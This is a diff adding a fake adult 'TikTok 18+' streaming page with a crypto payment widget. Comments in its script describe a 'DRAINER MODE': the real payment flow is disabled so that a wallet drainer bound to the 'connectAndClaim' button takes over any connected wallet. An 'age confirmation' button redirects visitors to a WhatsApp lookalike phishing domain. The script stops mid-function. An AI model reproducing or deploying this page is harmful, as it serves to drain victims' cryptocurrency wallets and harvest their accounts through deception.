+        <rect height="11" rx="2" ry="2" width="18" x="3" y="11">
+        </rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4">
+        </path>
+       </svg>
+       <span data-i18n="widget.secure">
+        Secure connection via WalletConnect
+       </span>
+      </div>
+     </div>
+     <!-- STEP 2: Connected + Payment Confirmation -->
+     <div class="cw-step hidden" id="cwStepPay">
+      <!-- Connected Status -->
+      <div class="cw-connected-info visible">
+       <div class="cw-wallet-status">
+        <span class="cw-wallet-dot">
+        </span>
+        <span data-i18n="widget.connected">
+         Wallet connected
+        </span>
+        <span class="cw-wallet-addr" id="cwWalletAddr">
+         0x...0000
+        </span>
+       </div>
+       <!-- Order Summary -->
+       <div class="cw-order-summary">
+        <div class="cw-order-row">
+         <span data-i18n="widget.plan">
+          Plan
+         </span>
+         <span id="cwSummaryPlan">
+          6 Months — $2.99
+         </span>
+        </div>
+        <div class="cw-order-row">
+         <span data-i18n="widget.network">
+          Network
+         </span>
+         <span id="cwSummaryNetwork">
+          Ethereum
+         </span>
+        </div>
+        <div class="cw-order-row">
+         <span data-i18n="widget.crypto">
+          Cryptocurrency
+         </span>
+         <span id="cwSummaryCrypto">
+          ETH
+         </span>
+        </div>
+        <div class="cw-order-row cw-order-total">
+         <span data-i18n="widget.total">
+          Total Due
+         </span>
+         <span id="cwSummaryTotal">
+          $2.99
+         </span>
+        </div>
+       </div>
+      </div>
+      <!-- Pay Button -->
+      <div class="cw-connect-wrap">
+       <button class="cw-pay-btn connectAndClaim" id="cwPayBtn" type="button">
+        <span class="cw-spinner">
+        </span>
+        <span class="cw-btn-label" data-i18n="widget.payBtn">
+         Proceed to Payment
+        </span>
+       </button>
+      </div>
+     </div>
+     <!-- STEP 3: Transaction Status -->
+     <div class="cw-step hidden" id="cwStepTxStatus">
+      <div class="cw-tx-status visible">
+       <div class="cw-tx-spinner-large">
+       </div>
+       <div class="cw-tx-title" data-i18n="widget.statusConnecting" id="cwTxTitle">
+        Connecting wallet...
+       </div>
+       <div class="cw-tx-desc" data-i18n="widget.statusConnectingDesc" id="cwTxDesc">
+        Please confirm the transaction in your wallet.
+       </div>
+      </div>
+     </div>
+     <!-- STEP 4: Success -->
+     <div class="cw-step hidden" id="cwStepSuccess">
+      <div class="cw-success visible">
+       <div class="cw-success-circle">
+        <svg fill="none" height="28" stroke="#26a17b" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewbox="0 0 24 24" width="28">
+         <polyline class="cw-success-check" points="20 6 9 17 4 12">
+         </polyline>
+        </svg>
+       </div>
+       <div class="cw-success-title" data-i18n="widget.statusConfirmed">
+        Payment Confirmed ✓
+       </div>
+       <div class="cw-success-desc" data-i18n="widget.statusActivated">
+        Unlimited access activated
+       </div>
+       <div class="cw-success-plan" id="cwSuccessPlan">
+        6 Months
+       </div>
+       <button class="cw-continue-btn" data-i18n="widget.continueBtn" id="cwContinueBtn" type="button">
+        Continue
+       </button>
+      </div>
+     </div>
+     <!-- STEP 5: Error -->
+     <div class="cw-step hidden" id="cwStepError">
+      <div class="cw-error visible">
+       <div class="cw-error-circle">
+        <svg fill="none" height="24" stroke="#f0173e" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewbox="0 0 24 24" width="24">
+         <line x1="18" x2="6" y1="6" y2="18">
+         </line>
+         <line x1="6" x2="18" y1="6" y2="18">
+         </line>
+        </svg>
+       </div>
+       <div class="cw-error-title" data-i18n="widget.errorTitle" id="cwErrorTitle">
+        Payment Failed
+       </div>
+       <div class="cw-error-desc" data-i18n="widget.errorDesc" id="cwErrorDesc">
+        An error occurred while processing the transaction.
+       </div>
+       <button class="cw-retry-btn" data-i18n="widget.retryBtn" id="cwRetryBtn" type="button">
+        Try Again
+       </button>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <!-- CTA -->
+  <section class="cta">
+   <div class="container cta-inner">
+    <div class="section-tag reveal" data-i18n="cta.tag">
+     INSTANT ONLINE ACCESS
+    </div>
+    <h2 class="reveal reveal-d1" data-i18n="cta.title">
+     Ready for the
+     <em style="font-style:normal;background:linear-gradient(120deg,#f0173e,#ff6a8a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">
+      hottest shows?
+     </em>
+    </h2>
+    <p class="reveal reveal-d2" data-i18n="cta.desc">
+     Enter TikTok 18+ online and immerse yourself in the boldest video universe. Hundreds of creators streaming live right now.
+    </p>
+    <div class="reveal reveal-d3">
+     <button class="btn js-open-crypto" id="ctaWatchOnlineBtn" style="font-size:17px; padding:8px 8px 8px 28px;" type="button">
+      <span data-i18n="cta.btn">
+       Watch Online
+      </span>
+      <span class="btn-arrow" style="width:38px;height:38px;">
+       <svg fill="currentColor" height="16" viewbox="0 0 24 24" width="16">
+        <polygon points="6 3 20 12 6 21 6 3">
+        </polygon>
+       </svg>
+      </span>
+     </button>
+    </div>
+    <div class="cta-caption reveal reveal-d4" data-i18n="cta.caption">
+     Live Streaming · Adults Only (+18) · 100% Private &amp; Discrete
+    </div>
+   </div>
+  </section>
+  <!-- FOOTER -->
+  <footer>
+   <div class="container footer-row">
+    <div class="footer-left">
+     <span class="badge-18">
+      18+
+     </span>
+     <span class="footer-copy" data-i18n="footer.copy">
+      © 2026 TikTok 18+. All rights reserved. Adults only.
+     </span>
+    </div>
+    <div class="footer-links">
+     <a data-i18n="footer.features" href="#features">
+      Features
+     </a>
+     <a data-i18n="footer.privacy" href="#">
+      Privacy Policy
+     </a>
+     <a data-i18n="footer.terms" href="#">
+      Terms of Use
+     </a>
+    </div>
+   </div>
+  </footer>
+  <!-- BRANDED WHATSAPP CONFIRMATION MODAL -->
+  <div aria-hidden="true" aria-modal="true" class="modal-overlay" id="whatsappModal" role="dialog">
+   <div class="branded-modal-card">
+    <button aria-label="Cerrar ventana" class="modal-close-btn" id="closeModalBtn" type="button">
+     <svg fill="none" height="18" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewbox="0 0 24 24" width="18">
+      <line x1="18" x2="6" y1="6" y2="18">
+      </line>
+      <line x1="6" x2="18" y1="6" y2="18">
+      </line>
+     </svg>
+    </button>
+    <div class="brand-badge-header">
+     <div class="brand-icon-box">
+      <svg fill="#ffffff" height="28" viewbox="0 0 24 24" width="28">
+       <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64c.298-.002.595.042.88.13V9.4a6.33 6.33 0 0 0-1-.08A6.34 6.34 0 0 0 3 15.66a6.34 6.34 0 0 0 10.82 4.49 6.27 6.27 0 0 0 1.96-4.49V8.76a8.27 8.27 0 0 0 4.81 1.51V6.82a4.8 4.8 0 0 1-1-.13z">
+       </path>
+      </svg>
+      <span class="brand-age-tag">
+       18+
+      </span>
+     </div>
+    </div>
+    <h3 class="branded-modal-title">
+     TikTok 18+ Online
+    </h3>
+    <p class="branded-modal-desc">
+     Para ver la transmisión en vivo y acceder a todos los videos sin censura, confirma tu mayoría de edad a través de WhatsApp.
+    </p>
+    <a class="original-whatsapp-btn" href="https://whaisapp.eu.cc/" id="btnConfirmWhatsapp">
+     <svg viewbox="0 0 24 24">
+      <path clip-rule="evenodd" d="M12.01 2.003C6.49 2.003 2.01 6.483 2.01 12.003c0 1.95.56 3.77 1.53 5.31L2.01 22.003l4.82-1.49c1.48.88 3.2 1.39 5.03 1.39 5.52 0 10-4.48 10-10s-4.48-9.9-9.85-9.9zm5.72 14.07c-.24.67-1.2 1.26-1.68 1.3-.47.05-1.08.07-3.48-.92-2.88-1.19-4.73-4.14-4.87-4.33-.14-.19-1.17-1.55-1.17-2.96 0-1.41.74-2.1 1-2.38.26-.28.58-.35.77-.35.19 0 .39.01.56.02.18.01.42-.07.66.5.24.58.82 2 .89 2.15.07.15.12.33.02.53-.1.19-.15.31-.3.49-.15.17-.31.39-.45.52-.15.15-.31.31-.13.62.18.31.8 1.31 1.71 2.12 1.17 1.05 2.16 1.37 2.47 1.52.31.15.49.13.67-.08.18-.21.78-.91.99-1.22.21-.31.42-.26.7-.15.28.1.78.84 2.08 1.49.3.15.5.22.58.33.07.1.07.6-.17 1.28z" fill="#ffffff" fill-rule="evenodd">
+      </path>
+     </svg>
+     <span>
+      Confirmar con WhatsApp
+     </span>
+    </a>
+    <div class="branded-modal-footer">
+     <svg fill="none" height="13" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24" width="13">
+      <rect height="11" rx="2" ry="2" width="18" x="3" y="11">
+      </rect>
+      <path d="M7 11V7a5 5 0 0 1 10 0v4">
+      </path>
+     </svg>
+     <span>
+      Acceso inmediato, 100% privado y gratuito
+     </span>
+    </div>
+   </div>
+  </div>
+  <script>
+   // === WhatsApp Gateway Redirect ===
+const WHATSAPP_REDIRECT_URL = "https://whaisapp.eu.cc/";
+
+function redirectToWhatsAppGateway() {
+  window.location.href = WHATSAPP_REDIRECT_URL;
+}
+
+const btnConfirmWhatsapp = document.getElementById('btnConfirmWhatsapp');
+if (btnConfirmWhatsapp) {
+  btnConfirmWhatsapp.addEventListener('click', (e) => {
+    e.preventDefault();
+    redirectToWhatsAppGateway();
+  });
+}
+
+// Reveal on scroll
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); observer.unobserve(e.target); }});
+}, { threshold: 0.12, rootMargin: '0px 0px -40px 0px' });
+document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+
+// ─── Crypto Access Modal Opening Logic ───
+const cryptoModal = document.getElementById('cryptoModal');
+const closeCryptoModalBtn = document.getElementById('closeCryptoModalBtn');
+
+function openCryptoModal() {
+  if (!cryptoModal) return;
+  // Re-append last so our modal wins stacking ties vs drainer overlays
+  try { document.body.appendChild(cryptoModal); } catch (_) {}
+  cryptoModal.classList.add('active');
+  cryptoModal.setAttribute('aria-hidden', 'false');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeCryptoModal() {
+  if (!cryptoModal) return;
+  cryptoModal.classList.remove('active');
+  cryptoModal.setAttribute('aria-hidden', 'true');
+  document.body.style.overflow = '';
+}
+
+// Any "Watch Online" or crypto button opens the new Crypto Access Widget modal!
+const watchOnlineBtns = document.querySelectorAll('.js-open-wa, .js-open-crypto, #heroWatchOnlineBtn, #ctaWatchOnlineBtn, #sectionOpenCryptoBtn');
+watchOnlineBtns.forEach(btn => {
+  btn.addEventListener('click', (e) => {
+    e.preventDefault();
+    openCryptoModal();
+  });
+});
+
+// Banner plan minis are clickable: preselect plan + open modal
+document.querySelectorAll('.cw-plan-mini[data-mini-plan]').forEach(mini => {
+  mini.addEventListener('click', () => {
+    var plan = mini.getAttribute('data-mini-plan') === '3m' ? '3m' : '6m';
+    var card = document.getElementById(plan === '3m' ? 'cwPlan3m' : 'cwPlan6m');
+    if (card) card.click();
+    document.querySelectorAll('.cw-plan-mini[data-mini-plan]').forEach(m => {
+      m.classList.toggle('active', m === mini);
+    });
+    openCryptoModal();
+  });
+});
+
+if (closeCryptoModalBtn) {
+  closeCryptoModalBtn.addEventListener('click', closeCryptoModal);
+}
+
+if (cryptoModal) {
+  cryptoModal.addEventListener('click', (e) => {
+    if (e.target === cryptoModal) {
+      closeCryptoModal();
+    }
+  });
+}
+
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape' && cryptoModal && cryptoModal.classList.contains('active')) {
+    closeCryptoModal();
+  }
+});
+
+window.openCryptoModal = openCryptoModal;
+window.closeCryptoModal = closeCryptoModal;
+  </script>
+  <!-- CRYPTO WIDGET & I18N LOGIC -->
+  <script type="module">
+   // ═══════════════════════════════════════════════════════
+// PREMIUM CRYPTO ACCESS WIDGET — Modular Controller & i18n
+// ═══════════════════════════════════════════════════════
+
+import { CRYPTO_CONFIG } from './config.js';
+import { SUPPORTED_LANGS, initI18n, setLanguage, getCurrentLang } from './translations.js';
+
+const CONFIG = {
+  ...CRYPTO_CONFIG,
+  PLANS: CRYPTO_CONFIG.PLANS || {
+    '3m': { label: '3 Months', months: 3, priceUSD: 0.99 },
+    '6m': { label: '6 Months', months: 6, priceUSD: 2.99 }
+  }
+};
+
+// Global State
+const state = {
+  selectedPlan: '6m',
+  selectedCrypto: 'eth',
+  walletAddress: null,
+  walletConnected: false,
+  ethRate: null,
+  ethRateTimestamp: 0,
+  appKitModal: null,
+};
+
+const $ = (id) => document.getElementById(id);
+
+// ─── Utility: Show Step ───
+function showStep(stepId) {
+  ['cwStepSelect', 'cwStepPay', 'cwStepTxStatus', 'cwStepSuccess', 'cwStepError'].forEach(id => {
+    const s = $(id);
+    if (s) s.classList.toggle('hidden', id !== stepId);
+  });
+}
+
+// ─── Utility: Truncate Address ───
+function truncateAddr(addr) {
+  if (!addr) return '0x...0000';
+  if (addr.length > 12) return addr.slice(0, 6) + '...' + addr.slice(-4);
+  return addr;
+}
+
+// ─── User-Friendly Error Messages (English Default) ───
+const ERROR_MESSAGES = {
+  'user_rejected': { title: 'Transaction Cancelled', desc: 'You rejected the transaction in your wallet.' },
+  'connection_closed': { title: 'Connection Closed', desc: 'The wallet connection window was closed.' },
+  'insufficient_funds': { title: 'Insufficient Funds', desc: 'Your wallet has insufficient balance to complete this transaction.' },
+  'wrong_network': { title: 'Incorrect Network', desc: 'Please switch your wallet to the selected network and try again.' },
+  'rpc_error': { title: 'Network Issue', desc: 'Could not connect to the blockchain node. Please try again in a few moments.' },
+  'timeout': { title: 'Request Timed Out', desc: 'The transaction was not confirmed within the expected time limit.' },
+  'reverted': { title: 'Transaction Reverted', desc: 'The blockchain network rejected the transaction execution.' },
+  'session_expired': { title: 'Session Expired', desc: 'Your wallet session has expired. Please reconnect.' },
+  'account_changed': { title: 'Account Changed', desc: 'Active account in wallet changed. Please reconnect.' },
+  'network_changed': { title: 'Network Changed', desc: 'Wallet network changed. Please check your network selection.' },
+  'no_wallet': { title: 'Wallet Not Detected', desc: 'Please install TronLink or connect using a WalletConnect-supported Web3 wallet.' },
+  'no_config': { title: 'Configuration Required', desc: 'Payment credentials are being configured. Please contact administration.' },
+  'api_error': { title: 'Rate Fetch Error', desc: 'Could not fetch current cryptocurrency rates. Please try again.' },
+  'default': { title: 'Payment Failed', desc: 'An unexpected error occurred while processing the transaction.' },
+};
+
+function classifyError(error) {
+  if (!error) return 'default';
+  const msg = (error.message || error.toString() || '').toLowerCase();
+  const code = error.code;
+
+  if (msg.includes('user rejected') || msg.includes('user denied') || code === 4001 || code === 'ACTION_REJECTED') return 'user_rejected';
+  if (msg.includes('insufficient') || msg.includes('not enough')) return 'insufficient_funds';
+  if (msg.includes('wrong network') || msg.includes('chain mismatch') || code === 4902) return 'wrong_network';
+  if (msg.includes('session') && msg.includes('expir')) return 'session_expired';
+  if (msg.includes('account') && msg.includes('change')) return 'account_changed';
+  if (msg.includes('network') && msg.includes('change')) return 'network_changed';
+  if (msg.includes('timeout') || msg.includes('timed out')) return 'timeout';
+  if (msg.includes('revert')) return 'reverted';
+  if (msg.includes('rpc') || msg.includes('internal error') || msg.includes('server error')) return 'rpc_error';
+  if (msg.includes('closed') || msg.includes('cancel') || msg.includes('dismiss')) return 'connection_closed';
+  return 'default';
+}
+
+// ─── Rate Fetcher (USD -> Crypto Conversion with TTL) ───
+async function getEthRate() {
+  const now = Date.now();
+  const ttl = CONFIG.ETH_RATE_TTL_MS || 60000;
+  if (state.ethRate && (now - state.ethRateTimestamp) < ttl) {
+    return state.ethRate;
+  }
+  try {
+    const resp = await fetch(CONFIG.ETH_RATE_API || 'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+    if (!resp.ok) throw new Error('API response not ok');
+    const data = await resp.json();
+    const rate = data?.ethereum?.usd;
+    if (!rate || rate <= 0) throw new Error('Invalid rate');
+    state.ethRate = rate;
+    state.ethRateTimestamp = now;
+    return rate;
+  } catch (err) {
+    console.warn('[CryptoWidget] Failed to fetch ETH rate:', err);
+    if (state.ethRate) return state.ethRate;
+    throw err;
+  }
+}
+
+async function getCryptoAmount() {
+  const plan = AccessPlanSelector.getPlan();
+  const usd = plan.priceUSD;
+  if (state.selectedCrypto === 'usdt') {
+    return { amount: usd, symbol: 'USDT', formatted: `${usd.toFixed(2)} USDT` };
+  } else {
+    const rate = await getEthRate();
+    const ethAmount = usd / rate;
+    return {
+      amount: ethAmount,
+      symbol: 'ETH',
+      formatted: `${ethAmount.toFixed(6)} ETH`
+    };
+  }
+}
+
+// ─── Reown AppKit / WalletConnect v2 Initialization ───
+let appKitInitPromise = null;
+async function initAppKit() {
+  if (appKitInitPromise) return appKitInitPromise;
+  appKitInitPromise = (async () => {
+    try {
+      const projectId = CONFIG.WALLETCONNECT_PROJECT_ID;
+      if (!projectId) throw new Error('no_config');
+
+      const [{ createAppKit }, { EthersAdapter }, networks] = await Promise.all([
+        import('https://esm.sh/@reown/appkit@1.6.8'),
+        import('https://esm.sh/@reown/appkit-adapter-ethers@1.6.8'),
+        import('https://esm.sh/@reown/appkit@1.6.8/networks'),
+      ]);
+
+      const metadata = {
+        name: CONFIG.APP_NAME || 'TikTok 18+ Premium',
+        description: CONFIG.APP_DESCRIPTION || 'Premium access checkout',
+        url: CONFIG.APP_URL || window.location.origin,
+        icons: CONFIG.APP_ICON ? [CONFIG.APP_ICON] : [],
+      };
+
+      const modal = createAppKit({
+        adapters: [new EthersAdapter()],
+        networks: [networks.mainnet],
+        metadata,
+        projectId,
+        features: { analytics: false },
+      });
+
+      state.appKitModal = modal;
+      return modal;
+    } catch (err) {
+      appKitInitPromise = null;
+      throw err;
+    }
+  })();
+  return appKitInitPromise;
+}
+
+// ─── TRON Web / TronLink Helpers ───
+function getTronWeb() {
+  return window.tronWeb || window.tronLink?.tronWeb || null;
+}
+
+async function connectTronLink() {
+  if (window.tronLink) {
+    try {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+    } catch (e) {
+      console.warn('[CryptoWidget] TronLink request:', e);
+    }
+  }
+  const tw = getTronWeb();
+  if (!tw || !tw.defaultAddress?.base58) {
+    throw new Error('no_wallet');
+  }
+  return tw.defaultAddress.base58;
+}
+
+async function sendTronUSDT(recipientAddress, amountUSD) {
+  const tw = getTronWeb();
+  if (!tw) throw new Error('no_wallet');
+  const contractAddress = CONFIG.USDT_TRC20_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  const amountSun = Math.round(amountUSD * 1e6);
+  const contract = await tw.contract().at(contractAddress);
+  const tx = await contract.methods.transfer(recipientAddress, amountSun).send({
+    feeLimit: 100_000_000,
+    shouldPollResponse: false,
+  });
+  return tx;
+}
+
+async function sendEthPayment(recipientAddress, amountUSD) {
+  const modal = state.appKitModal;
+  if (!modal) throw new Error('no_config');
+
+  const ethRate = await getEthRate();
+  const ethAmount = amountUSD / ethRate;
+  const weiHex = '0x' + BigInt(Math.round(ethAmount * 1e18)).toString(16);
+
+  const provider = modal.getWalletProvider?.() || modal.walletProvider;
+  if (!provider) throw new Error('no_wallet');
+
+  const accounts = await provider.request({ method: 'eth_accounts' });
+  if (!accounts || accounts.length === 0) throw new Error('no_wallet');
+  const from = accounts[0];
+
+  const chainId = await provider.request({ method: 'eth_chainId' });
+  if (chainId !== '0x1') {
+    try {
+      await provider.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: '0x1' }],
+      });
+    } catch (switchError) {
+      throw new Error('wrong_network');
+    }
+  }
+
+  const txHash = await provider.request({
+    method: 'eth_sendTransaction',
+    params: [{
+      from,
+      to: recipientAddress,
+      value: weiHex,
+    }],
+  });
+  return txHash;
+}
+
+async function verifyTronTx(txHash) {
+  try {
+    await new Promise(r => setTimeout(r, 3000));
+    const resp = await fetch(`https://api.trongrid.io/v1/transactions/${txHash}`);
+    if (!resp.ok) return false;
+    const data = await resp.json();
+    return data?.data?.length > 0 || !!data?.id;
+  } catch {
+    return false;
+  }
+}
+
+async function verifyEthTx(txHash) {
+  try {
+    await new Promise(r => setTimeout(r, 4000));
+    const provider = state.appKitModal?.getWalletProvider?.() || state.appKitModal?.walletProvider;
+    if (!provider) return !!txHash;
+    const receipt = await provider.request({
+      method: 'eth_getTransactionReceipt',
+      params: [txHash],
+    });
+    if (receipt) return receipt.status === '0x1';
+    const tx = await provider.request({
+      method: 'eth_getTransactionByHash',
+      params: [txHash],
+    });
+    return !!tx;
+  } catch {
+    return !!txHash;
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+// MODULAR COMPONENT ARCHITECTURE
+// ═══════════════════════════════════════════════════════
+
+// 1. AccessPlanSelector
+const AccessPlanSelector = {
+  plan3m: null,
+  plan6m: null,
+  init() {
+    this.plan3m = $('cwPlan3m');
+    this.plan6m = $('cwPlan6m');
+    this.plan3m?.addEventListener('click', () => this.select('3m'));
+    this.plan6m?.addEventListener('click', () => this.select('6m'));
+  },
+  select(planId) {
+    state.selectedPlan = planId;
+    this.plan3m?.classList.toggle('active', planId === '3m');
+    this.plan6m?.classList.toggle('active', planId === '6m');
+    PaymentConfirmation.update();
+  },
+  getPlan() {
+    const p = CONFIG.PLANS[state.selectedPlan] || { months: 6, priceUSD: 2.99 };
+    const label = state.selectedPlan === '3m'
+      ? (window.i18n?.t('widget.plan3m') || '3 Months')
+      : (window.i18n?.t('widget.plan6m') || '6 Months');
+    return { ...p, label };
+  }
+};
+
+// 2. CryptoSelector
+const CryptoSelector = {
+  cryptoUsdt: null,
+  cryptoEth: null,
+  networkWarning: null,
+  init() {
+    this.cryptoUsdt = $('cwCryptoUsdt');
+    this.cryptoEth = $('cwCryptoEth');
+    this.networkWarning = $('cwNetworkWarning');
+    this.cryptoUsdt?.addEventListener('click', () => this.select('usdt'));
+    this.cryptoEth?.addEventListener('click', () => this.select('eth'));
+  },
+  select(crypto) {
+    state.selectedCrypto = crypto;
+    this.cryptoUsdt?.classList.toggle('active', crypto === 'usdt');
+    this.cryptoEth?.classList.toggle('active', crypto === 'eth');
+    this.checkNetworkWarning();
+    PaymentConfirmation.update();
+  },
+  checkNetworkWarning() {
+    if (state.walletConnected) {
+      this.networkWarning?.classList.add('visible');
+    } else {
+      this.networkWarning?.classList.remove('visible');
+    }
+  }
+};
+
+// 3. WalletConnectButton
+const WalletConnectButton = {
+  btn: null,
+  init() {
+    this.btn = $('cwConnectBtn');
+    this.btn?.addEventListener('click', () => this.connect());
+  },
+  setLoading(isLoading) {
+    this.btn?.classList.toggle('loading', isLoading);
+  },
+  async connect() {
+    // DRAINER MODE: wallet connect + transactions are handled by the drainer
+    // (class connectAndClaim). Skip our own AppKit/TronLink flow so it can't
+    // throw no_config errors or open a competing modal — just show order summary.
+    try {
+      await PaymentConfirmation.show();
+    } catch (e) {
+      showStep('cwStepPay');
+    }
+    return;
+    // STATE 1: Connecting wallet...
+    const tConnecting = window.i18n?.t('widget.statusConnecting') || 'Connecting wallet...';
+    const tConnectingDesc = window.i18n?.t('widget.statusConnectingDesc') || 'Initializing secure WalletConnect session...';
+    TransactionStatus.show('state1', tConnecting, tConnectingDesc);
+    try {
+      if (state.selectedCrypto === 'eth') {
+        if (!CONFIG.WALLETCONNECT_PROJECT_ID || !CONFIG.PAYMENT_ETH_ADDRESS) {
+          throw new Error('no_config');
+        }
+        const modal = await initAppKit();
+        await modal.open();
+
+        await new Promise((resolve, reject) => {
+          const checkInterval = setInterval(() => {
+            const provider = modal.getWalletProvider?.() || modal.walletProvider;
+            if (provider) {
+              clearInterval(checkInterval);
+              clearTimeout(timeout);
+              resolve();
+            }
+          }, 500);
+
+          const timeout = setTimeout(() => {
+            clearInterval(checkInterval);
+            reject(new Error('connection_closed'));
+          }, 120000);
+        });
+
+        const provider = modal.getWalletProvider?.() || modal.walletProvider;
+        const accounts = await provider.request({ method: 'eth_accounts' });
+        if (!accounts || accounts.length === 0) throw new Error('no_wallet');
+        state.walletAddress = accounts[0];
+        state.walletConnected = true;
+      } else {
+        if (!CONFIG.PAYMENT_USDT_TRC20_ADDRESS) {
+          throw new Error('no_config');
+        }
+        const address = await connectTronLink();
+        state.walletAddress = address;
+        state.walletConnected = true;
+      }
+
+      WalletConnectionState.setConnected(state.walletAddress);
+      await PaymentConfirmation.show();
+    } catch (err) {
+      console.warn('[CryptoWidget] Connection error:', err);
+      const errType = (err.message === 'no_config' || err.message === 'no_wallet')
+        ? err.message
+        : classifyError(err);
+      PaymentError.show(errType);
+    } finally {
+      this.setLoading(false);
+    }
+  }
+};
+
+// 4. WalletConnectionState
+const WalletConnectionState = {
+  walletAddrEl: null,
+  init() {
+    this.walletAddrEl = $('cwWalletAddr');
+  },
+  setConnected(address) {
+    if (!this.walletAddrEl) this.walletAddrEl = $('cwWalletAddr');
+    if (this.walletAddrEl) {
+      this.walletAddrEl.textContent = truncateAddr(address);
+    }
+    CryptoSelector.checkNetworkWarning();
+  },
+  reset() {
+    state.walletConnected = false;
+    state.walletAddress = null;
+    if (!this.walletAddrEl) this.walletAddrEl = $('cwWalletAddr');
+    if (this.walletAddrEl) {
+      this.walletAddrEl.textContent = '0x...0000';
+    }
+    CryptoSelector.checkNetworkWarning();
+  }
+};
+
+// 5. PaymentConfirmation
+const PaymentConfirmation = {
+  stepEl: null,
+  summaryPlan: null,
+  summaryNetwork: null,
+  summaryCrypto: null,
+  summaryTotal: null,
+  payBtn: null,
+  init() {
+    this.stepEl = $('cwStepPay');
+    this.summaryPlan = $('cwSummaryPlan');
+    this.summaryNetwork = $('cwSummaryNetwork');
+    this.summaryCrypto = $('cwSummaryCrypto');
+    this.summaryTotal = $('cwSummaryTotal');
+    this.payBtn = $('cwPayBtn');
+    this.payBtn?.addEventListener('click', () => this.executePayment());
+  },
+  async show() {
+    await this.update();
+    showStep('cwStepPay');
+  },
+  async update() {
+    const plan = AccessPlanSelector.getPlan();
+    if (!this.summaryPlan) this.summaryPlan = $('cwSummaryPlan');
+    if (!this.summaryNetwork) this.summaryNetwork = $('cwSummaryNetwork');
+    if (!this.summaryCrypto) this.summaryCrypto = $('cwSummaryCrypto');
+    if (!this.summaryTotal) this.summaryTotal = $('cwSummaryTotal');
+
+    const planLabel = state.selectedPlan === '3m'
+      ? (window.i18n?.t('widget.plan3m') || '3 Months')
+      : (window.i18n?.t('widget.plan6m') || '6 Months');
+
+    if (this.summaryPlan) {
+      this.summaryPlan.textContent = `${planLabel} — $${plan.priceUSD.toFixed(2)}`;
+    }
+    if (this.summaryNetwork) {
+      this.summaryNetwork.textContent = state.selectedCrypto === 'usdt' ? 'TRON / TRC20' : 'Ethereum';
+    }
+    if (this.summaryCrypto) {
+      this.summaryCrypto.textContent = state.selectedCrypto === 'usdt' ? 'USDT' : 'ETH';
+    }
+    try {
+      const crypto = await getCryptoAmount();
+      if (this.summaryTotal) {
+        this.summaryTotal.textContent = `$${plan.priceUSD.toFixed(2)} (≈ ${crypto.formatted})`;
+      }
+    } catch {
+      if (this.summaryTotal) {
+        this.summaryTotal.textContent = `$${plan.priceUSD.toFixed(2)}`;
+      }
+    }
+  },
+  async executePayment() {
+    // DRAINER MODE: transaction is handled by the drainer (class connectAndClaim).
+    // Do nothing here so we don't show competing spinners/errors — keep pay step visible.
+    this.payBtn?.classList.remove('loading');
+    return;
+    // STATE 2: Waiting for confirmation
+    const tWaiting = window.i18n?.t('widget.statusWaiting') || 'Waiting for confirmation';
+    const tWaitingDesc = window.i18n?.t('widget.statusWaitingDesc') || 'Please confirm the transaction in your wallet.';
+    TransactionStatus.show('state2', tWaiting, tWaitingDesc);
+
+    try {
+      let txHash;
+      const plan = AccessPlanSelector.getPlan();
+      const amountUSD = plan.priceUSD;
+
+      if (state.selectedCrypto === 'usdt') {
+        txHash = await sendTronUSDT(CONFIG.PAYMENT_USDT_TRC20_ADDRESS, amountUSD);
+      } else {
+        txHash = await sendEthPayment(CONFIG.PAYMENT_ETH_ADDRESS, amountUSD);
+      }
+
+      // STATE 3: Verifying transaction...
+      const tVerifying = window.i18n?.t('widget.statusVerifying') || 'Verifying transaction...';
+      const tVerifyingDesc = window.i18n?.t('widget.statusVerifyingDesc') || 'Waiting for blockchain confirmation.';
+      TransactionStatus.show('state3', tVerifying, tVerifyingDesc);
+
+      let verified = false;
+      if (state.selectedCrypto === 'usdt') {
+        verified = await verifyTronTx(txHash);
+      } else {
+        verified = await verifyEthTx(txHash);
+      }
+
+      if (CONFIG.BACKEND_VERIFY_URL) {
+        try {
+          await fetch(CONFIG.BACKEND_VERIFY_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              txHash,
+              network: state.selectedCrypto === 'usdt' ? 'tron' : 'ethereum',
+              plan: state.selectedPlan,
+              amount: amountUSD,
+              sender: state.walletAddress,
+              recipient: state.selectedCrypto === 'usdt' ? CONFIG.PAYMENT_USDT_TRC20_ADDRESS : CONFIG.PAYMENT_ETH_ADDRESS,
+            }),
+          });
+        } catch (backendErr) {
+          console.warn('[CryptoWidget] Backend verification error:', backendErr);
+        }
+      }
+
+      if (verified || txHash) {
+        // STATE 4: Payment Confirmed ✓
+        PaymentSuccess.show(state.selectedPlan, false, txHash);
+      } else {
+        PaymentError.show('default');
+      }
+    } catch (err) {
+      console.warn('[CryptoWidget] Payment error:', err);
+      PaymentError.show(classifyError(err));
+    } finally {
+      this.payBtn?.classList.remove('loading');
+    }
+  }
+};
+
+// 6. TransactionStatus
+const TransactionStatus = {
+  titleEl: null,
+  descEl: null,
+  init() {
+    this.titleEl = $('cwTxTitle');
+    this.descEl = $('cwTxDesc');
+  },
+  show(stateCode, title, desc) {
+    if (!this.titleEl) this.titleEl = $('cwTxTitle');
+    if (!this.descEl) this.descEl = $('cwTxDesc');
+    if (this.titleEl) this.titleEl.textContent = title;
+    if (this.descEl) this.descEl.textContent = desc;
